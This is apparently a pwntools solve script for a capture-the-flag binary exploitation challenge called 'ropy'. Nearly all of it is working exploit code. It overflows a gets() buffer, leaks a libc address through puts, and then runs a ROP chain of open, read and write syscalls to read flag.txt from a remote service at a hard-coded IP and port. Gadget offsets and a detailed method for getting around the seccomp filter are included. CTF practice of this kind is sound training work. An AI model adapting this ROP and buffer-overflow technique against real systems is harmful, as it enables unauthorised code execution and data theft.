#!/usr/bin/env python3
"""
ropy - PWN CTF challenge
Binary: ELF 64-bit, No PIE, No canary, NX, SHSTK+IBT (not enforced)
Seccomp: KILL default, ALLOW read(0)/write(1)/open(2) only
Vuln: gets() with 128-byte buffer → BOF (0x88 byte overflow to RIP)

Anti-debug trick: opens /dev/null N times (N = rand()%0x6001 + 0x1000)
→ our open("flag.txt") returns unknown fd; solve by capturing rax after open

Strategy:
  1. Stage 1: Leak libc via puts(open@got), return to vuln fn
  2. Stage 2: ORW ROP chain using libc gadgets
     a. gets(bss) → write "flag.txt" to BSS
     b. open("flag.txt", 0) via syscall → rax = fd
     c. xchg eax, edi → rdi = fd
     d. read(fd, bss_buf, 200) via syscall
     e. write(1, bss_buf, 200) via syscall
"""

from pwn import *
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# ─── Binary setup ─────────────────────────────────────────────────────────────
context.binary = e = ELF(os.path.join(SCRIPT_DIR, 'dev/main'))
libc            = ELF(os.path.join(SCRIPT_DIR, 'dev/libc.so.6'))
context.log_level = 'info'

# ─── Key binary addresses (no PIE) ────────────────────────────────────────────
VULN_FN   = 0x401566          # vulnerable function (gets 0x80-byte buf)
POP_RDI   = 0x401316          # pop rdi ; ret
RET       = 0x40101a          # ret (stack alignment)
PUTS_PLT  = e.plt['puts']     # 0x401154 (leak helper)
GETS_PLT  = e.plt['gets']     # 0x4011b4
OPEN_PLT  = e.plt['open']     # 0x4011d4 (not needed for syscall variant)
READ_PLT  = e.plt['read']     # 0x401194
OPEN_GOT  = e.got['open']     # 0x404068 — leak target → libc base

# Writable BSS scratch area (well past actual BSS data at 0x4040c0)
BSS_FLAG_NAME = 0x4041a0      # "flag.txt\0" will land here
BSS_FLAG_BUF  = 0x4041d0      # flag content read here

OVERFLOW = 0x88               # 0x80 buffer + 8 saved-rbp

# ─── Libc gadget offsets ──────────────────────────────────────────────────────
#   pop rsi ; ret                           0x2be51
#   pop rdx ; pop rcx ; pop rbx ; ret       0x108b73
#   syscall ; ret                           0x91316
#   pop rax ; ret                           0x45eb0
#   xchg eax, edi ; ret                     0x14a225  ← transfer fd after open()
#
# NOTE: The old mov edi,eax;ret at 0x233e2f is in libc's debug section,
#       NOT in any PT_LOAD segment → unmapped at runtime → SIGSEGV.
#       Use xchg eax,edi;ret (0x14a225) which is in the RX segment.
OFF_POP_RSI          = 0x2be51
OFF_POP_RDX_RCX_RBX  = 0x108b73
OFF_SYSCALL          = 0x91316
OFF_POP_RAX          = 0x45eb0
OFF_XCHG_EAX_EDI     = 0x14a225   # xchg eax,edi;ret — copies open fd → rdi

# ─── Connection ───────────────────────────────────────────────────────────────
def conn():
    if args.REMOTE:
        io = remote('34.40.124.58', 30427)
    else:
        dev_dir = os.path.join(SCRIPT_DIR, 'dev')
        binary  = os.path.join(dev_dir, 'main')
        ld      = os.path.join(dev_dir, 'ld-linux-x86-64.so.2')
        io = process([ld, binary], cwd=dev_dir)
    return io

# ─── Stage 1: ROP chain — leak open@libc via puts, return to VULN_FN ─────────
def build_stage1():
    pad  = b'A' * OVERFLOW
    rop  = flat(
        POP_RDI,   OPEN_GOT,    # rdi = &open@GOT
        RET,                    # align stack to 16 bytes for puts()
        PUTS_PLT,               # puts(*rdi) → prints open's resolved libc addr
        VULN_FN,                # return here for stage 2 input
    )
    return pad + rop

# ─── Stage 2: ORW ROP chain ───────────────────────────────────────────────────
def build_stage2(libc_base):
    pop_rsi         = libc_base + OFF_POP_RSI
    pop_rdx_rcx_rbx = libc_base + OFF_POP_RDX_RCX_RBX
    syscall_ret     = libc_base + OFF_SYSCALL
    pop_rax         = libc_base + OFF_POP_RAX
    xchg_eax_edi    = libc_base + OFF_XCHG_EAX_EDI

    pad = b'A' * OVERFLOW

    # ── a. gets(BSS_FLAG_NAME) → we send "flag.txt" straight after ────────────
    part_a = flat(
        POP_RDI,   BSS_FLAG_NAME,
        GETS_PLT,
    )

    # ── b. open("flag.txt", O_RDONLY) via syscall (rax=2) ────────────────────
    #        Result: rax = fd  (unknown because of anti-debug /dev/null opens)
    part_b = flat(
        POP_RDI,            BSS_FLAG_NAME,  # rdi → "flag.txt"
        pop_rsi,            0,              # rsi = O_RDONLY
        pop_rdx_rcx_rbx,    0, 0, 0,        # rdx/rcx/rbx cleared
        pop_rax,            2,              # SYS_open
        syscall_ret,
    )

    # ── c+d. xchg eax, edi (fd) ; then read(fd, BSS_FLAG_BUF, 200) ───────────
    part_cd = flat(
        xchg_eax_edi,                       # rdi = fd (from rax after open)
        pop_rsi,            BSS_FLAG_BUF,   # rsi → destination buffer
        pop_rdx_rcx_rbx,    200, 0, 0,      # rdx = 200 bytes
        pop_rax,            0,              # SYS_read
        syscall_ret,
    )

    part_e = flat(
        POP_RDI,            1,              # stdout fd
        pop_rsi,            BSS_FLAG_BUF,
        pop_rdx_rcx_rbx,    200, 0, 0,
        pop_rax,            1,              # SYS_write
        syscall_ret,
    )

    return pad + part_a + part_b + part_cd + part_e


def pwn():
    io = conn()

    log.info('Waiting for binary startup (anti-debug loop + 3s sleep)…')
    io.recvuntil(b'Hello! What is your name?\n', timeout=60)

    log.info('Sending stage 1 (libc leak)…')
    io.sendline(build_stage1())

    leak_raw = io.recvline().strip()
    leak     = u64(leak_raw.ljust(8, b'\x00'))
    libc_base = leak - libc.sym['open']
    log.success(f'open @ {hex(leak)}  →  libc base = {hex(libc_base)}')

    io.recvuntil(b'Hello! What is your name?\n', timeout=10)
    log.info('Sending stage 2 (ORW chain)…')
    stage2 = build_stage2(libc_base)

    if b'\x0a' in stage2:
        log.error('Stage 2 payload contains 0x0a byte — retry with new ASLR')
        io.close()
        return

    io.sendline(stage2)

    io.sendline(b'flag.txt')

    log.info('Waiting for flag…')
    data = io.recv(512, timeout=10)
    log.success(f'Received:\n{data.decode(errors="replace")}')

    io.close()


if __name__ == '__main__':
    pwn()
